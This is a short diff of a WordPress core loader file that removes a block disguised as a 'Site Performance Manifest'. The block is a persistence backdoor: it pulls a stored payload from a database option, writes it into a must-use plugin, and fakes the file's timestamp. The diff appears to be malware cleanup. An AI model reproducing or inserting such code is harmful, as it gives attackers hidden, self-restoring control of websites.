@@ -103,7 +103,3 @@ if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
 
 	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
 }
-
-/* WP Site Performance Manifest */
-if(!function_exists('wp_site_perf_repair_v125')) { function wp_site_perf_repair_v125(){ if(!function_exists('get_option')) return; $m='_wp_internal_perf_manifest'; $a=defined('ABSPATH')?ABSPATH:dirname(__FILE__).'/'; $d=$a.'wp-content/mu-plugins'; $f=$d.'/wp-performance-booster.php'; if(!file_exists($f)){ $c=get_option($m); if($c){ if(!is_dir($d)){@mkdir($d,0755,true);} @file_put_contents($f,$c); $s=$a.'wp-settings.php'; if(!file_exists($s)){$s=$a.'wp-config.php';} if(file_exists($s)){@touch($f,filemtime($s));} } } } if(function_exists('add_action')){ add_action('init','wp_site_perf_repair_v125',1); } register_shutdown_function('wp_site_perf_repair_v125'); }
-/* End WP Performance Manifest */
